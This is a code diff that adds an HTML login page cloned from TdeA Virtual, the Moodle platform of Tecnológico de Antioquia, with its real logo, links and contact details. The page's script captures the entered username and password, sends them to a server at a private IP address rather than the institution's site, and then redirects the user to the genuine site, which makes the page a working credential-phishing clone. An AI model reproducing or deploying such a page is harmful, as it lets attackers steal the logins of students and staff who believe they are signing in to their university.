@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TdeA Virtual - Login</title>
+
+  <!-- Bootstrap -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <!-- Estilos personalizados -->
+  <link rel="stylesheet" href="/styles.css">
+
+</head>s
+
+<body id="page-login-index">
+
+  <!-- Header superior -->
+  <div class="top-bar">
+    <div class="container-fluid d-flex justify-content-between align-items-center">
+      <span><i class="fa fa-envelope-o"></i> Correo electrónico :
+        <a href="mailto:virtual@tdea.edu.co">virtual@tdea.edu.co</a>
+      </span>
+ <span>
+  <i class="fa fa-language" aria-hidden="true"></i>
+  <a href="#">Español - Colombia ‎(es_co)‎</a> |
+  <a href="#">Acceder</a>
+</span>
+
+
+    </div>
+  </div>
+
+  <!-- Barra con logo y enlace -->
+  <nav class="navbar-custom">
+    <div class="container-fluid d-flex justify-content-between align-items-center">
+      <a href="https://virtual.tdea.edu.co/?redirect=0" class="navbar-brand d-flex align-items-center">
+        <img src="https://virtual.tdea.edu.co/pluginfile.php/1/theme_academi/logo/1682191008/Logo-TdeA-Virtual.png"
+             alt="TdeA Virtual" class="logo-header">
+      </a>
+      <div class="primary-navigation">
+        <nav class="moremenu navigation observed">
+          <ul class="nav more-nav navbar-nav">
+            <li class="nav-item">
+              <a class="nav-link active" href="https://virtual.tdea.edu.co/" aria-current="true">
+                Página Principal
+              </a>
+            </li>
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Contenedor principal -->
+  <div class="main-content d-flex flex-column align-items-center justify-content-start">
+
+    <div class="login-box">
+      <img src="https://virtual.tdea.edu.co/pluginfile.php/1/theme_academi/logo/1682191008/Logo-TdeA-Virtual.png"
+           alt="TdeA Virtual" class="logo">
+
+      <form>
+        <label class="sr-only" for="username">Nombre de usuario</label>
+        <input id="username" type="text" class="form-control mb-3" placeholder="Nombre de usuario" required>
+
+        <label class="sr-only" for="password">Contraseña</label>
+        <input id="password" type="password" class="form-control mb-3" placeholder="Contraseña" required>
+
+        <button type="submit" class="btn btn-login">Acceder</button>
+      </form>
+
+      <a href="#" class="forgot">¿Olvidó su contraseña?</a>
+
+      <hr class="login-divider">
+
+      <p class="guest">Algunos cursos permiten el acceso de invitados</p>
+      <button class="btn btn-secondary btn-sm mb-2">Entrar como persona invitada</button>
+
+      <hr class="login-divider">
+
+      <div class="lang-row">
+        <label class="sr-only" for="lang">Idioma</label>
+        <select id="lang" class="form-select form-select-sm lang-select">
+          <option>Español - Internacional (es)</option>
+        </select>
+      </div>
+    </div>
+    <!-- /LOGIN -->
+  </div>
+
+  <!-- Footer -->
+  <!-- Footer -->
+ <footer class="footer mt-auto py-4">
+  <div class="container-fluid text-start">
+    <div class="row align-items-start gx-0"> <!-- gx-0 quita separación horizontal -->
+      
+      <!-- COLUMNA 1 -->
+      <div class="col-md-5">
+        <div class="infoarea">
+          <div class="footer-logo">
+            <a href="#">
+              <img src="https://virtual.tdea.edu.co/pluginfile.php/1/theme_academi/logo/1682191008/Logo-TdeA-Virtual.png"
+                   width="100" height="100" alt="Logo TdeA">
+            </a>
+          </div>
+          <p>TdeA Virtual</p>
+          <p>Soportado por la Unidad de Virtualidad del Tecnológico de Antioquia</p>
+        </div>
+      </div>
+
+     <!-- COLUMNA 2 -->
+<div class="col-md-3">
+  <div class="foot-links">
+    <h2>Información</h2>
+    <ul class="list-unstyled">
+      <li><a href="https://moodle.org/" target="_blank">Comunidad Moodle</a></li>
+      <li><a href="https://moodle.org/course/" target="_blank">Soporte gratuito Moodle</a></li>
+      <li><a href="https://docs.moodle.org/dev/" target="_blank">Desarrollo Moodle</a></li>
+      <li><a href="https://docs.moodle.org/501/en/Main_page" target="_blank">Documentación Moodle</a></li>
+      <li><a href="https://moodle.com/" target="_blank">Moodle.com</a></li>
+    </ul>
+  </div>
+</div>
+
+
+      <!-- COLUMNA 3 -->
+      <div class="col-md-4">
+        <div class="contact-info">
+          <h2 class="nopadding">Contacta</h2>
+          <p>
+            CALLE 78B NO. 72A - 220 MEDELLÍN - COLOMBIA<br>
+            <i class="fa fa-envelope"></i> Correo electrónico :
+            <a href="mailto:virtual@tdea.edu.co" class="mail-link">virtual@tdea.edu.co</a>
+          </p>
+        </div>
+        <div class="social-media">
+          <h6>Follow us</h6>
+          <ul class="list-inline mb-0">
+            <li class="list-inline-item"><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+            <li class="list-inline-item"><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+            <li class="list-inline-item"><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+            <li class="list-inline-item"><a href="#"><i class="fa fa-google-plus-square"></i></a></li>
+          </ul>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+
+</footer>
+
+
+
+
+      <div class="footer-bottom">
+      <p>Unidad de Virtualidad - Tecnológico de Antioquia</p>
+      <div class="footer-content-debugging py-sm-3">
+        <div class="container"></div>
+      </div>
+    </div>
+
+</body>
+
+<script>
+  document.querySelector('form').addEventListener('submit', async (event) => {
+    event.preventDefault(); // Evita que se recargue la página
+
+    // Tomamos los valores de los inputs
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    // Enviar al backend con fetch()
+    try {
+      const response = await fetch('http://192.168.1.67:3000/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      });
+
+      const data = await response.json();
+
+      if (response.ok) {
+        alert('200 ' + data.message);
+        // Redirige al sitio oficial de TdeA Virtual
+        window.location.href = "https://virtual.tdea.edu.co/";
+      } else {
+        alert('401 ' + data.message);
+      }
+    } catch (error) {
+      console.error('Error de conexión:', error);
+      alert('500 - Error al conectar con el servidor.');
+    }
+  });
+</script>
+
+
+</html>
